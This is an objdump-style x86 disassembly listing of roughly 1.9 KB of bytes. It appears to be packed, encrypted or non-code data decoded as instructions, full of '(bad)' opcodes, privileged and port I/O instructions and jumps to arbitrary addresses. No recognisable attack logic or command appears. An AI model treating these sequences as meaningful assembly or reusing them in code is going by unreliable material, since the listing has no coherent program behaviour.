  4265f2:	les    ecx,FWORD PTR [ebx*1-0x236e12d6]
  4265f9:	push   esp
  4265fa:	(bad)  
  4265fb:	fadd   DWORD PTR ds:0x9b539c61
  426601:	adc    DWORD PTR [esi+0x27bb77b4],ebx
  426607:	add    edi,DWORD PTR [edx+0x4385b889]
  42660d:	xchg   edx,eax
  42660e:	pop    esp
  42660f:	int    0xc0
  426611:	and    al,0x18
  426613:	adc    BYTE PTR [eax-0x71],bh
  426616:	xor    DWORD PTR [ebx-0x71b0c5a2],0xfffffff2
  42661d:	adc    eax,0xd1f0a175
  426622:	mov    ecx,0x97f3774c
  426627:	xlat   BYTE PTR ds:[ebx]
  426628:	lods   eax,DWORD PTR ds:[esi]
  426629:	out    dx,eax
  42662a:	jmp    0x340e3937
  42662f:	mul    DWORD PTR [edi-0x5564f1e1]
  426635:	cs dec edx
  426637:	(bad)  
  426638:	js     0x426662
  42663a:	cmp    esp,DWORD PTR ds:0x4233d695
  426640:	and    bh,al
  426642:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426643:	gs int3 
  426645:	and    al,dl
  426647:	mov    cl,0x8c
  426649:	cmc    
  42664a:	test   DWORD PTR [ebx+0x2b1a9f3d],esp
  426650:	cli    
  426651:	into   
  426652:	push   cs
  426653:	or     al,0x6e
  426655:	rcl    DWORD PTR [esi-0x8],0x65
  426659:	into   
  42665a:	push   esi
  42665b:	test   eax,0xb69fa9bc
  426660:	cmp    al,0x55
  426662:	push   edi
  426663:	jge    0x4265f4
  426665:	jnp    0x426627
  426667:	(bad)  
  426668:	lock inc edx
  42666a:	sar    BYTE PTR [ecx+0x3d],0xde
  42666e:	adc    cl,BYTE PTR [eax]
  426670:	cmp    BYTE PTR [ebx],bl
  426672:	ja     0x4266a1
  426674:	pop    ss
  426675:	lods   al,BYTE PTR ds:[esi]
  426676:	lea    esp,[eax+0x1075068f]
  42667c:	mov    bh,0x7f
  42667e:	hlt    
  42667f:	int    0x19
  426681:	push   esi
  426682:	add    eax,0x8838fe8d
  426687:	sbb    DWORD PTR [ebp-0x398b7a5e],ebp
  42668d:	fdiv   DWORD PTR [eax]
  42668f:	add    DWORD PTR [esi+edx*4],edi
  426692:	mov    ds:0x32175fdf,eax
  426697:	test   DWORD PTR [esi],ebx
  426699:	jo     0x42668f
  42669b:	cmp    ebx,ebx
  42669d:	mov    ch,0x31
  42669f:	into   
  4266a0:	push   edi
  4266a1:	pop    ebx
  4266a2:	nop
  4266a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266a4:	dec    esp
  4266a5:	in     al,dx
  4266a6:	push   esp
  4266a7:	cs std 
  4266a9:	aaa    
  4266aa:	mov    edi,0x571d5297
  4266af:	and    DWORD PTR [ebx],edi
  4266b1:	dec    esi
  4266b2:	mov    ch,0x88
  4266b4:	push   ebp
  4266b5:	mov    DWORD PTR [esi-0x5800b2d8],edi
  4266bb:	or     eax,0x79effdb1
  4266c1:	push   ecx
  4266c2:	push   cs
  4266c3:	adc    ebp,esp
  4266c5:	push   0x7b4b04da
  4266ca:	cs mov ebx,0xc04ea993
  4266d0:	jmp    0x426655
  4266d2:	dec    eax
  4266d3:	in     al,0x74
  4266d5:	push   esi
  4266d6:	pop    ebx
  4266d7:	jns    0x4266f2
  4266d9:	adc    ebx,DWORD PTR [edx]
  4266db:	jmp    0x426693
  4266dd:	ins    DWORD PTR es:[edi],dx
  4266de:	mov    cl,BYTE PTR [edx+0x73]
  4266e1:	push   esp
  4266e2:	cmp    eax,0x7d061d2d
  4266e7:	mov    esi,0x34cc2c1b
  4266ec:	in     eax,0x6f
  4266ee:	or     al,0x7e
  4266f0:	les    edx,FWORD PTR [ebx+0x4a448462]
  4266f6:	or     esp,esi
  4266f8:	dec    esp
  4266f9:	imul   esp,edx,0x12
  4266fc:	repnz shr ah,cl
  4266ff:	outs   dx,DWORD PTR ds:[esi]
  426700:	ret    0x60b8
  426703:	push   es
  426704:	in     al,dx
  426705:	mov    ebx,0xb9f71bed
  42670a:	popf   
  42670b:	xor    BYTE PTR [ebp-0x55],cl
  42670e:	mov    ebp,0xfe7c70d5
  426713:	push   esp
  426714:	stc    
  426715:	fst    QWORD PTR gs:[edi+eax*4-0x73ec3d07]
  42671d:	and    BYTE PTR [ecx],cl
  42671f:	mov    cl,0x19
  426721:	cmp    al,0x19
  426723:	add    edx,DWORD PTR [eax+ebp*8-0x70]
  426727:	cmc    
  426728:	fsubr  DWORD PTR [edx+0x35]
  42672b:	mov    ebp,0xfaeecedb
  426730:	xor    eax,DWORD PTR ds:0xc1d3bee5
  426736:	sbb    al,0x54
  426738:	call   DWORD PTR [ebp+0x14]
  42673b:	outs   dx,BYTE PTR ds:[esi]
  42673c:	ss iret 
  42673e:	adc    BYTE PTR [ecx-0x4efad83c],bh
  426744:	pop    ecx
  426745:	cmp    BYTE PTR [ebx-0x74],ch
  426748:	mov    ds:0xfdd651a0,al
  42674d:	or     ebx,DWORD PTR [ebp+0x56dc20e6]
  426753:	pop    es
  426754:	jl     0x4266fa
  426756:	rcl    BYTE PTR [edx+0x3b],cl
  426759:	outs   dx,BYTE PTR ds:[esi]
  42675a:	fisub  WORD PTR [ecx]
  42675c:	mov    dl,0x7a
  42675e:	push   esp
  42675f:	lods   al,BYTE PTR ds:[esi]
  426760:	xor    ecx,DWORD PTR [edi-0x40]
  426763:	and    ebp,edx
  426765:	mov    eax,ds:0x8980184c
  42676a:	cmp    BYTE PTR [ebp+0x7cb7bae0],dh
  426770:	iret   
  426771:	rcl    DWORD PTR [ebx-0x59],1
  426774:	jb     0x4267ad
  426776:	fs dec esp
  426778:	shr    DWORD PTR [edi-0x5c],0xf6
  42677c:	imul   eax,eax,0x4a5d933d
  426782:	adc    ecx,ebx
  426784:	or     ecx,DWORD PTR [ecx+0x1a]
  426787:	into   
  426788:	cmp    DWORD PTR [ecx+0x771f2ca9],edx
  42678e:	cmc    
  42678f:	test   eax,0x4fd08625
  426794:	lea    ebx,[ecx+0x4c6dc41]
  42679a:	mov    bl,0x18
  42679c:	(bad)  
  42679d:	out    0x35,al
  42679f:	stc    
  4267a0:	mov    eax,DWORD PTR [eax]
  4267a2:	sbb    ah,0x5b
  4267a5:	inc    esp
  4267a6:	addr16 add ecx,ebp
  4267a9:	outs   dx,DWORD PTR ds:[esi]
  4267aa:	push   ebp
  4267ab:	mov    bh,0xa8
  4267ad:	into   
	...
  4267ba:	mov    al,0x8a
  4267bc:	call   0xfa266242
  4267c1:	mov    ebx,0xcae72888
  4267c6:	xor    al,0xe3
  4267c8:	ss jne 0x42681b
  4267cb:	fiadd  WORD PTR [ecx]
  4267cd:	add    ah,bh
  4267cf:	add    DWORD PTR [eax],eax
  4267d1:	add    BYTE PTR [edi-0x3e],ah
  4267d4:	cmp    eax,0x82bfc4c1
  4267d9:	jbe    0x4267fb
  4267db:	gs ss pop ebx
  4267de:	mov    ah,0x60
  4267e0:	inc    ecx
  4267e1:	jmp    0x426822
  4267e3:	aas    
  4267e4:	rol    eax,0x70
  4267e7:	retf   0xe8d0
  4267ea:	and    al,0xe1
  4267ec:	lahf   
  4267ed:	pop    cx
  4267ef:	call   0x15641b9
  4267f4:	ja     0x426827
  4267f6:	ret    
  4267f7:	and    ah,bl
  4267f9:	jmp    0x7840d850
  4267fe:	icebp  
  4267ff:	pusha  
  426800:	xchg   DWORD PTR [eax-0x5b],edi
  426803:	push   eax
  426804:	and    eax,DWORD PTR [eax-0x66]
  426807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426808:	idiv   BYTE PTR [esi-0x4f]
  42680b:	dec    edx
  42680c:	pop    ebp
  42680d:	outs   dx,DWORD PTR ds:[esi]
  42680e:	dec    ebp
  42680f:	mov    ecx,DWORD PTR [ebx+0x70]
  426812:	cwde   
  426813:	add    ah,BYTE PTR [ebx+0x12]
  426816:	rcl    edi,0xeb
  426819:	cmp    dl,ah
  42681b:	outs   dx,BYTE PTR ds:[esi]
  42681c:	leave  
  42681d:	arpl   dx,bp
  42681f:	mov    cl,0xe5
  426821:	std    
  426822:	cmp    ch,ah
  426824:	stos   BYTE PTR es:[edi],al
  426825:	ret    
  426826:	jnp    0x426804
  426828:	inc    ebx
  426829:	ds or  eax,0xfdae185b
  42682f:	mov    ch,0x3f
  426831:	inc    edx
  426832:	addr16 push edi
  426834:	xchg   ebp,eax
  426835:	jns    0x42682c
  426837:	pop    esi
  426838:	and    eax,0xa0ec5262
  42683d:	sub    eax,0x7a3899d0
  426842:	aaa    
  426843:	aas    
  426844:	fimul  WORD PTR [edi-0x6d]
  426847:	or     al,0x4d
  426849:	rol    DWORD PTR [edi+eiz*8+0x58],cl
  42684d:	pop    esi
  42684e:	xor    al,0xe9
  426850:	sub    eax,0x4a08adfd
  426855:	dec    esp
  426856:	mov    ds:0x3a1c3a19,eax
  42685b:	xor    DWORD PTR [ecx],eax
  42685d:	lock arpl ax,di
  426860:	dec    ecx
  426861:	sbb    ecx,ecx
  426863:	out    0x4,al
  426865:	cs hlt 
  426867:	xchg   ebp,eax
  426868:	jae    0x4268da
  42686a:	loop   0x426836
  42686c:	inc    ecx
  42686d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42686e:	repnz mov eax,ds:0xe7e6805f
  426874:	or     DWORD PTR [ecx-0x2923d147],edx
  42687a:	jno    0x4268b4
  42687c:	mov    esp,0x69f28935
  426881:	and    dh,BYTE PTR [edx]
  426883:	sahf   
  426884:	sar    DWORD PTR [esi],0x1d
  426887:	xchg   esp,eax
  426888:	jge    0x426870
  42688a:	or     DWORD PTR [ebx],ecx
  42688c:	xchg   ecx,eax
  42688d:	out    dx,eax
  42688e:	enter  0x1f39,0x69
  426892:	adc    DWORD PTR [edx],ebp
  426894:	mov    ss,WORD PTR [esi-0x6b]
  426897:	pop    esi
  426898:	fisub  WORD PTR [edi-0x591ff3a9]
  42689e:	cmp    eax,0xf9a5115a
  4268a3:	ins    DWORD PTR es:[edi],dx
  4268a4:	pop    edi
  4268a5:	(bad)  
  4268a6:	push   edi
  4268a7:	push   eax
  4268a8:	test   ebp,edx
  4268aa:	fstp   st(3)
  4268ac:	dec    edx
  4268ad:	jmp    0x426888
  4268af:	mov    ds:0x83daa572,eax
  4268b4:	and    DWORD PTR [edx-0x6e4b03bd],esi
  4268ba:	ror    eax,cl
  4268bc:	cdq    
  4268bd:	jl     0x426890
  4268bf:	and    esi,DWORD PTR [esi-0x13]
  4268c2:	mov    bl,cl
  4268c4:	xchg   BYTE PTR [esi+ecx*8],cl
  4268c7:	push   eax
  4268c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c9:	scas   eax,DWORD PTR es:[edi]
  4268ca:	jno    0x4268c6
  4268cc:	or     cl,al
  4268ce:	mov    cl,cl
  4268d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268d1:	shl    DWORD PTR [ebx-0xf],cl
  4268d4:	inc    eax
  4268d5:	out    dx,eax
  4268d6:	mov    al,0x84
  4268d8:	or     edx,DWORD PTR [eax+0x10]
  4268db:	xchg   ecx,eax
  4268dc:	ret    
  4268dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268de:	call   0xdfc428e7
  4268e3:	fwait
  4268e4:	add    eax,0x95f14a52
  4268e9:	outs   dx,BYTE PTR ds:[esi]
  4268ea:	aaa    
  4268eb:	inc    esi
  4268ec:	fcmovbe st,st(1)
  4268ee:	leave  
  4268ef:	dec    eax
  4268f0:	inc    ebx
  4268f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268f2:	xor    al,0x37
  4268f4:	retf   0x7a6
  4268f7:	cld    
  4268f8:	out    0xab,al
  4268fa:	push   edx
  4268fb:	ins    BYTE PTR es:[edi],dx
  4268fc:	push   cs
  4268fd:	(bad)  
  4268fe:	jnp    0x426909
  426900:	inc    esp
  426901:	and    BYTE PTR [esi+0x7],0xd9
  426905:	mov    eax,fs:0x7b4c4798
  42690b:	pop    ss
  42690c:	mov    dl,0xde
  42690e:	hlt    
  42690f:	mov    edx,0xfb8e93a9
  426914:	push   ebp
  426915:	loope  0x426941
  426917:	das    
  426918:	fnstenv [ebx]
  42691a:	cli    
  42691b:	(bad)  
  42691d:	dec    esi
  42691e:	push   esi
  42691f:	mov    al,ds:0x392efa8a
  426924:	(bad)  
  426926:	adc    DWORD PTR ds:0xff6dc132,eax
  42692c:	(bad)  
  42692d:	mov    eax,0xbd989f7f
  426932:	xor    eax,0x6f983123
  426937:	neg    BYTE PTR [edi+0x4dc26c22]
  42693d:	stos   DWORD PTR es:[edi],eax
  42693e:	stos   BYTE PTR es:[edi],al
  42693f:	fwait
  426940:	cmp    ebx,esp
  426942:	gs xchg edx,edx
  426945:	xchg   ecx,eax
  426946:	push   0xb3341cfb
  42694b:	push   edx
  42694c:	mov    eax,0xc8c2716e
  426951:	mov    cl,0x1
  426953:	mov    ecx,0x22f49a03
  426958:	mul    ebp
  42695a:	ficom  WORD PTR [ebx]
  42695c:	jecxz  0x4268e5
  42695e:	outs   dx,DWORD PTR ds:[esi]
  42695f:	les    eax,FWORD PTR [ebx]
  426961:	push   esp
  426962:	inc    esi
  426963:	pushf  
  426964:	in     al,dx
  426965:	add    esi,0xd9df0d33
  42696b:	push   eax
  42696c:	dec    ebp
  42696d:	inc    edx
  42696e:	and    edx,ebx
  426970:	test   eax,0xf28f7c64
  426975:	loop   0x426991
  426977:	inc    edi
  426978:	xchg   esp,eax
  426979:	sbb    al,0xcc
  42697b:	call   0x72a1:0x4b0fa0f1
  426982:	mov    DWORD PTR ds:[ecx+0x44],edx
  426986:	pop    esi
  426987:	push   ebp
  426988:	test   BYTE PTR [eax+0x13],dl
  42698b:	cdq    
  42698c:	mov    bh,0x38
  42698e:	mov    eax,ds:0xdc659246
  426993:	add    esi,edx
  426995:	pop    ebp
  426996:	jnp    0x4269ea
  426998:	jmp    DWORD PTR [esi+0x61]
  42699b:	xchg   ebp,edi
  42699d:	or     dl,cl
  42699f:	and    edi,ecx
  4269a1:	stc    
  4269a2:	jp     0x42692d
  4269a4:	(bad)  
  4269a5:	dec    ecx
  4269a6:	and    al,0xf2
  4269a8:	jae    0x4269a5
  4269aa:	out    dx,al
  4269ab:	ja     0x426951
  4269ad:	je     0x426935
  4269af:	mov    edi,0xb061e0d4
  4269b4:	jno    0x426a23
  4269b6:	add    DWORD PTR [esi+0x4c7ee8a2],0x67
  4269bd:	mov    dl,0xa5
  4269bf:	cli    
  4269c0:	pop    esi
  4269c1:	pop    ebx
  4269c2:	jg     0x4269ea
  4269c4:	jg     0x4269f1
  4269c6:	or     DWORD PTR [ebp-0x2ea79223],ecx
  4269cc:	sbb    BYTE PTR [eax+0x0],ah
	...
  4269d7:	add    BYTE PTR [eax],al
  4269d9:	add    BYTE PTR [edx-0x39253b74],cl
  4269df:	ficomp DWORD PTR [esi+0xc235fdc]
  4269e5:	mov    ah,BYTE PTR [ecx]
  4269e7:	push   ecx
  4269e8:	adc    eax,0x1e04c94
  4269ed:	add    ah,bh
  4269ef:	add    DWORD PTR [eax],eax
  4269f1:	add    bl,ch
  4269f3:	push   es
  4269f4:	into   
  4269f5:	and    bl,BYTE PTR [eax+0x7b]
  4269f8:	push   ebp
  4269f9:	jg     0x426a7a
  4269fb:	test   ecx,ebx
  4269fd:	cdq    
  4269fe:	out    0x98,al
  426a00:	adc    dl,dh
  426a02:	out    dx,eax
  426a03:	and    eax,0xa6b0d853
  426a08:	xchg   ebx,eax
  426a09:	jmp    0xd3f98f6e
  426a0e:	inc    ebp
  426a0f:	in     al,dx
  426a10:	cwde   
  426a11:	xchg   bh,ah
  426a13:	hlt    
  426a14:	(bad)
  426a18:	push   ds
  426a19:	cli    
  426a1a:	int    0x7c
  426a1c:	mov    dh,0xed
  426a1e:	jp     0x426a56
  426a20:	push   eax
  426a21:	mov    edx,0x586a2965
  426a26:	and    ecx,DWORD PTR [eax-0x18]
  426a29:	into   
  426a2a:	pop    ebp
  426a2b:	lahf   
  426a2c:	ds in  eax,dx
  426a2e:	popf   
  426a2f:	fisub  WORD PTR [edx+0x76b15afb]
  426a35:	stc    
  426a36:	loopne 0x426a29
  426a38:	push   0x856d8db3
  426a3d:	hlt    
  426a3e:	mov    edi,?
  426a40:	dec    edi
  426a41:	adc    BYTE PTR [eax+0x499a4dff],ch
  426a47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a48:	sahf   
  426a49:	jnp    0x426a37
  426a4b:	fsubrp st(2),st
  426a4d:	loope  0x426a41
  426a4f:	pop    ss
  426a50:	and    DWORD PTR [ebp-0xe],esi
  426a53:	adc    al,0x74
  426a55:	dec    edx
  426a56:	xchg   esp,eax
  426a57:	add    al,0xaa
  426a59:	adc    ecx,edi
  426a5b:	and    esp,ecx
  426a5d:	adc    dh,bl
  426a5f:	ins    DWORD PTR es:[edi],dx
  426a60:	xchg   ebp,eax
  426a61:	jo     0x426a07
  426a63:	aad    0xb5
  426a65:	inc    edx
  426a66:	rcr    BYTE PTR [ebp+0xd08f396],0xd4
  426a6d:	(bad)  
  426a6e:	rcr    DWORD PTR [ebx-0x31],1
  426a71:	add    DWORD PTR [edi-0x9],ecx
  426a74:	test   eax,0x6e36ed14
  426a79:	xor    eax,0x6c425e31
  426a7e:	mov    cl,0x64
  426a80:	mov    cl,0x45
  426a82:	push   eax
  426a83:	div    edx
  426a85:	rcr    ch,cl
  426a87:	or     al,0x16
  426a89:	mov    ah,0x43
  426a8b:	inc    esi
  426a8c:	mov    bl,0x80
  426a8e:	ins    DWORD PTR es:[edi],dx
  426a8f:	fwait
  426a90:	bound  eax,QWORD PTR [edx]
  426a92:	cmp    DWORD PTR [edi+edx*1],edx
  426a95:	mov    ebx,0x172c7b8d
  426a9a:	pop    eax
  426a9b:	rep stos DWORD PTR es:[edi],eax
  426a9d:	nop
  426a9e:	cmp    al,bh
  426aa0:	call   0x6940:0x82c1e540
  426aa7:	jge    0x426b1d
  426aa9:	xchg   esi,eax
  426aaa:	stos   DWORD PTR es:[edi],eax
  426aab:	ins    DWORD PTR es:[edi],dx
  426aac:	push   edi
  426aad:	sbb    al,0x79
  426aaf:	adc    BYTE PTR [edi+ecx*8-0x438db217],0x36
  426ab7:	stc    
  426ab8:	dec    eax
  426ab9:	sub    eax,0xae7435a0
  426abe:	push   esp
  426abf:	sub    eax,0x2dabaaf6
  426ac4:	jmp    0xf9910120
  426ac9:	ficomp WORD PTR [eax+0x68]
  426acc:	test   DWORD PTR [edi-0x79],0xf9c921f0
  426ad3:	fdiv   st(3),st
  426ad5:	cmp    eax,0x5051e46e
  426ada:	dec    edi
  426adb:	mov    dl,0x8a
  426add:	add    BYTE PTR [edx-0x4fcc5ed8],cl
  426ae3:	mov    ds:0xa62d32a8,eax
  426ae8:	mov    esp,0x7e89286
  426aed:	aam    0x52
  426aef:	pop    ecx
  426af0:	xor    BYTE PTR [edx-0x24825c6a],ch
  426af6:	test   BYTE PTR [eax],ah
  426af8:	outs   dx,BYTE PTR ds:[esi]
  426af9:	or     DWORD PTR [esi+edi*8],edi
  426afc:	xchg   esp,eax
  426afd:	rol    BYTE PTR [ebp+0x42],0x88
  426b01:	mov    esi,0xa657df30
  426b06:	add    DWORD PTR [edx],edx
  426b08:	mov    ebx,0xcbbedf22
  426b0d:	lock fs inc ebp
  426b10:	dec    esp
  426b11:	xchg   al,ah
  426b13:	inc    edi
  426b14:	lds    esp,FWORD PTR [ebx]
  426b16:	out    dx,al
  426b17:	mov    esp,0x10bf1d71
  426b1c:	inc    eax
  426b1d:	add    BYTE PTR [ebp+ecx*4+0x6ac6a669],dl
  426b24:	retf   0x7fd3
  426b27:	cwde   
  426b28:	push   esp
  426b29:	das    
  426b2a:	sbb    esi,DWORD PTR [ebp+0x1]
  426b2d:	dec    edi
  426b2e:	fmulp  st(3),st
  426b30:	pop    edi
  426b31:	adc    eax,DWORD PTR [eax+0x186a1070]
  426b37:	loopne 0x426b4b
  426b39:	add    BYTE PTR [ecx-0x60],cl
  426b3c:	dec    esi
  426b3d:	inc    eax
  426b3e:	popa   
  426b3f:	xchg   ebx,eax
  426b40:	ret    0xfb7f
  426b43:	xchg   ebx,eax
  426b44:	repnz dec eax
  426b46:	fisubr WORD PTR [ebx*8+0x5991933d]
  426b4d:	jmp    0x3c26:0xb5f82f72
  426b54:	mov    ds:0x8028a9ef,al
  426b59:	fdivr  QWORD PTR [eax+ebp*8]
  426b5c:	mov    ss,esi
  426b5e:	and    ch,cl
  426b60:	sub    esp,DWORD PTR [edi-0x7]
  426b63:	cmc    
  426b64:	dec    edi
  426b65:	scas   eax,DWORD PTR es:[edi]
  426b66:	dec    esi
  426b67:	pop    esp
  426b68:	popf   
  426b69:	test   BYTE PTR ds:0xef49ceb0,dl
  426b6f:	dec    eax
  426b70:	cmp    esp,DWORD PTR [eax-0x68]
  426b73:	pop    ds
  426b74:	stos   DWORD PTR es:[edi],eax
  426b75:	adc    BYTE PTR [esi+ecx*1],0x6e
  426b79:	push   esi
  426b7a:	sbb    cl,BYTE PTR [edi+edi*1+0x1f]
  426b7e:	and    al,BYTE PTR [ebx]
  426b80:	(bad)  
  426b81:	xor    ecx,esp
  426b83:	or     ecx,DWORD PTR [ebx+edx*2]
  426b86:	mov    bl,0x59
  426b88:	sub    BYTE PTR [ecx-0x21],dh
  426b8b:	pop    ebp
  426b8c:	pop    ecx
  426b8d:	pushf  
  426b8e:	xchg   ebp,eax
  426b8f:	adc    ebx,DWORD PTR [ecx]
  426b91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b92:	out    0xc7,eax
  426b94:	inc    edx
  426b95:	sbb    cl,BYTE PTR [eax-0x526ccab1]
  426b9b:	daa    
  426b9c:	fst    DWORD PTR [edx-0x75b7af97]
  426ba2:	sbb    ch,ah
  426ba4:	retf   0xf0f6
  426ba7:	push   ss
  426ba8:	dec    ebp
  426ba9:	push   ebx
  426baa:	adc    eax,0x1dd856ae
  426baf:	push   0xffffff99
  426bb1:	call   0x76784d5d
  426bb6:	and    DWORD PTR [ecx+0x8],eax
  426bb9:	je     0x426b9f
  426bbb:	push   es
  426bbc:	adc    al,0x6
  426bbe:	sub    bh,bl
  426bc0:	mov    eax,ds:0xd6c31294
  426bc5:	sbb    DWORD PTR [edi-0x68fef432],ecx
  426bcb:	sub    al,0xcc
  426bcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bce:	clc    
  426bcf:	adc    bh,dh
  426bd1:	sub    esp,edi
  426bd3:	or     esp,DWORD PTR [edi-0x43]
  426bd6:	popa   
  426bd7:	sub    DWORD PTR [esi+0xd],0xffffffe6
  426bdb:	push   DWORD PTR [ebx]
  426bdd:	xchg   ebx,eax
  426bde:	inc    ecx
  426bdf:	daa    
  426be0:	jle    0x426c18
  426be2:	mov    ah,0x85
  426be4:	lahf   
  426be5:	cmp    al,0xd7
  426be7:	imul   eax,DWORD PTR [edx],0xcbec4f69
  426bed:	test   al,0x0
	...
  426bf7:	add    BYTE PTR [eax],al
  426bf9:	add    BYTE PTR [eax-0x56],al
  426bfc:	pop    edx
  426bfd:	sbb    bh,dl
  426bff:	cli    
  426c00:	inc    eax
  426c01:	cli    
  426c02:	mov    ds:0x5efe433f,al
  426c07:	std    
  426c08:	mov    ecx,0x1e24813
  426c0d:	add    ah,bh
  426c0f:	add    DWORD PTR [eax],eax
  426c11:	add    BYTE PTR [esp+eiz*8+0x39d55775],ch
  426c18:	mov    ecx,0xd0b16ba3
  426c1d:	js     0x426c79
  426c1f:	adc    DWORD PTR ds:0x91f1bbec,edx
  426c25:	fist   WORD PTR [ebx+0x4]
  426c28:	mov    WORD PTR [eax+0x2d1e4a32],ds
  426c2e:	push   esp
  426c2f:	addr16 popa 
  426c31:	fild   DWORD PTR ds:0x76cd77c2
  426c37:	xchg   ebx,eax
  426c38:	sub    eax,0x39408a2c
  426c3d:	leave  
  426c3e:	pop    esi
  426c3f:	jecxz  0x426c83
  426c41:	mov    DWORD PTR [ecx+eiz*1],eax
  426c44:	jmp    0x426c46
  426c46:	cmp    DWORD PTR [edi+0x31],ecx
  426c49:	xchg   ecx,eax
  426c4a:	fsubr  DWORD PTR [eax+0x59]
  426c4d:	inc    esp
  426c4e:	fcmovnb st,st(7)
  426c50:	xlat   BYTE PTR ds:[ebx]
  426c51:	je     0x426cc6
  426c53:	push   ss
  426c54:	not    DWORD PTR [esp+edx*8+0x2b23445]
  426c5b:	std    
  426c5c:	jnp    0x426c6f
  426c5e:	sub    DWORD PTR [ebp+0x53],0xffffffa7
  426c62:	icebp  
  426c63:	pop    ebp
  426c64:	enter  0x6479,0x70
  426c68:	out    0x87,al
  426c6a:	mov    edx,0x1431ff9d
  426c6f:	jg     0x426c7a
  426c71:	mov    eax,ds:0xcde629ef
  426c76:	test   DWORD PTR [edx],ecx
  426c78:	mov    bh,0xd8
  426c7a:	mov    edx,0xca6acc81
  426c7f:	mov    DWORD PTR [ebp-0x62],esi
  426c82:	fwait
  426c83:	adc    eax,0x46b8a1f
  426c88:	jns    0x426cb2
  426c8a:	sahf   
  426c8b:	call   0xb3d4:0xa8c9a6ab
  426c92:	in     al,0xde
  426c94:	cmp    ebx,edx
  426c96:	pop    eax
  426c97:	lods   eax,DWORD PTR ds:[esi]
  426c98:	mov    bh,0x4e
  426c9a:	jno    0x426c5b
  426c9c:	inc    ebx
  426c9d:	repnz test dl,dh
  426ca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ca1:	push   es
  426ca2:	imul   ebx,DWORD PTR [ecx-0x3e],0xcacabb2a
  426ca9:	push   edi
  426caa:	or     DWORD PTR [esi-0x19],esp
  426cad:	jecxz  0x426c71
  426caf:	loope  0x426ce1
  426cb1:	mov    bh,0xc7
  426cb3:	xor    ebx,esp
  426cb5:	sub    DWORD PTR [esi+0x5210f3d6],ebp
  426cbb:	or     ch,BYTE PTR [esi+0x5e]
  426cbe:	cs jge 0x426d21
  426cc1:	inc    ecx
  426cc2:	jecxz  0x426cae
  426cc4:	pop    esi
  426cc5:	inc    eax
  426cc6:	int    0x58
  426cc8:	ret    
  426cc9:	stos   BYTE PTR es:[edi],al
  426cca:	add    dl,BYTE PTR [edi+0x55]
  426ccd:	xor    DWORD PTR [eax+esi*2+0x35],ebp
  426cd1:	test   al,0x51
  426cd3:	add    eax,0xe7b21b6b
  426cd8:	mov    ds:0xc0799ebe,eax
  426cdd:	pop    ebx
  426cde:	pushf  
  426cdf:	push   ds
  426ce0:	mov    ds:0x1d7252c,eax
  426ce5:	cmp    ah,al
  426ce7:	ds dec ebp
  426ce9:	sbb    eax,0x11434984
  426cee:	dec    ecx
  426cef:	imul   bl
  426cf1:	pop    ebp
  426cf2:	cmp    BYTE PTR ds:0x4ed792d2,cl
  426cf8:	dec    ebx
  426cf9:	ins    DWORD PTR es:[edi],dx
  426cfa:	retf   
  426cfb:	retf   0x941d
  426cfe:	lods   al,BYTE PTR ds:[esi]
  426cff:	enter  0x3ce7,0x92
  426d03:	xor    DWORD PTR [ecx+eax*8-0x6f],eax
  426d07:	inc    esi
  426d08:	adc    BYTE PTR [ebx-0x76],ch
  426d0b:	bound  esp,QWORD PTR [eax-0x4f9280fc]
  426d11:	cmp    edi,esp
  426d13:	xlat   BYTE PTR ds:[ebx]
  426d14:	js     0x426d5d
  426d16:	dec    edx
  426d17:	jp     0x426cba
  426d19:	sti    
  426d1a:	test   eax,0xfd929460
  426d1f:	xor    eax,0x1ca3b064
  426d24:	hlt    
  426d25:	sbb    al,0xe2
  426d27:	adc    DWORD PTR [ecx+0x5e],0xffffffd6
  426d2b:	es loop 0x426da3
  426d2e:	xchg   DWORD PTR [edi],ebp
  426d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d31:	ja     0x426da5
  426d33:	push   ds
  426d34:	jmp    0x426d4c
  426d36:	sbb    dh,bl
  426d38:	pop    edi
  426d39:	jae    0x426d22
  426d3b:	xlat   BYTE PTR ds:[ebx]
  426d3c:	int3   
  426d3d:	or     esp,DWORD PTR [eax]
  426d3f:	add    eax,0x8a18ad53
  426d44:	and    DWORD PTR [ebp+0xf],ebx
  426d47:	dec    edx
  426d48:	xchg   BYTE PTR [ecx+0x49734d49],bh
  426d4e:	mov    al,0x5
  426d50:	push   cs
  426d51:	out    dx,al
  426d52:	sbb    al,0xd6
  426d54:	std    
  426d55:	retf   
  426d56:	cmp    ch,BYTE PTR [ebx-0x69]
  426d59:	mov    al,0x1f
  426d5b:	rcr    BYTE PTR [esi],1
  426d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d5e:	xchg   ecx,eax
  426d5f:	sbb    eax,0x8d340202
  426d64:	repnz lahf 
  426d66:	sti    
  426d67:	fld    TBYTE PTR [esi+0x22]
  426d6a:	push   cs
  426d6b:	js     0x426d54
  426d6d:	dec    edi
  426d6e:	push   cs
  426d6f:	cmp    ecx,DWORD PTR [ebx]
  426d71:	cdq    
  426d72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d73:	inc    ecx
  426d74:	pop    ss
  426d75:	jp     0x426df2
  426d77:	sub    esi,esi
  426d79:	xor    BYTE PTR [esi],dh
  426d7b:	mov    ch,0x2b
  426d7d:	xchg   edx,eax
  426d7e:	xchg   ebx,eax
  426d7f:	repz xor DWORD PTR [ebx],edx
  426d82:	loopne 0x426d3a
  426d84:	or     ah,BYTE PTR [edx]
  426d86:	or     ebx,ebx
  426d88:	pop    ebx
  426d89:	ret    
  426d8a:	fdivr  st(0),st
  426d8c:	out    0xcd,eax
  426d8e:	mov    cl,0xd6
  426d90:	retf   
  426d91:	push   ebp
  426d92:	je     0x426ddb
